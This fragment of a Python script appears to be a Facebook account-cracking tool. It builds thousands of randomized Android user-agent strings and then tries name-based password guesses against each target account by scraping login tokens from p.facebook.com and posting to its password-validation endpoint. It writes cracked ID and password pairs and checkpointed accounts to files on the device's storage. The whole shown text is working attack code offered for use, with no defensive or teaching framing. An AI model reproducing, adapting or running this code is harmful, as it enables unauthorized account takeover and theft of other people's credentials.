                open('/sdcard/SWAG-M7-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#---

ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
#──────────────{ FILE-METHOD-M8 }──────────────#
def __filexxx__(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Ahmed'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			TRT=session.cookies.get_dict().keys()
			if "c_user" in TRT:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TRT:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
approval()